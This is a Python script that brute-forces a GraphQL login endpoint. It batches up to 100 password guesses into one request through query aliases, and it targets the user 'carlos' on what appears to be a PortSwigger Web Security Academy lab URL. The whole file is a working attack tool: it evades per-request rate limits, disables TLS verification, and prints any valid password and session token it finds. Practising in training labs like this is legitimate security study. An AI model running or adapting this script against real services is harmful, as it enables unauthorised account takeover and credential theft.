import requests
import json
from itertools import islice

def generate_graphql_query(passwords, username="carlos"):
    # Create aliases and password variables
    aliases = []
    variables = {}
    
    for i, password in enumerate(passwords, 1):
        alias = f"alias{i}"
        var_name = f"input{i}"
        
        aliases.append(f"{alias}: login(input: ${var_name}) {{ success token }}")
        variables[var_name] = {"username": username, "password": password}
    
    # Build the GraphQL query
    query = f"mutation login({', '.join(f'${var}: LoginInput' for var in variables.keys())}) {{\n"
    query += "\n".join(aliases)
    query += "\n}"
    
    return {"query": query, "variables": variables}

def batch_passwords(password_file, batch_size=100):
    with open(password_file, 'r') as f:
        while True:
            batch = list(islice(f, batch_size))
            if not batch:
                break
            yield [p.strip() for p in batch]

def bruteforce(url, password_file, headers=None):
    if headers is None:
        headers = {
            'Host': url.split('/')[2],
            'Accept': '*/*',
            'Accept-Language': 'en-US;q=0.9,en;q=0.8',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
            'Cache-Control': 'max-age=0',
            'Content-Type': 'application/json',
        }
    
    for password_batch in batch_passwords(password_file):
        payload = generate_graphql_query(password_batch)
        
        print(payload)
        try:
            response = requests.post(
                url,
                headers=headers,
                json=payload,
                verify=False  # Disable SSL verification (similar to -k in curl)
            )
            
            print(f"Sent batch of {len(password_batch)} passwords. Status code: {response.status_code}")
            
            # Check response for successful login
            if response.status_code == 200:
                data = response.json()
                for alias, result in data.get('data', {}).items():
                    if result and result.get('success'):
                        print(f"\n[+] Found valid credentials!")
                        print(f"Username: carlos")
                        print(f"Password: {password_batch[int(alias.replace('alias', ''))-1]}")
                        print(f"Token: {result.get('token')}")
                        return
                        
        except Exception as e:
            print(f"Error sending request: {e}")
            continue

if __name__ == "__main__":
    # Configuration
    target_url = "https://0aa300b604eb33ff80b45d8c001a00e7.web-security-academy.net/graphql/v1"
    password_file = "password.txt"  # Path to your password file
    
    # Run the bruteforce
    bruteforce(target_url, password_file)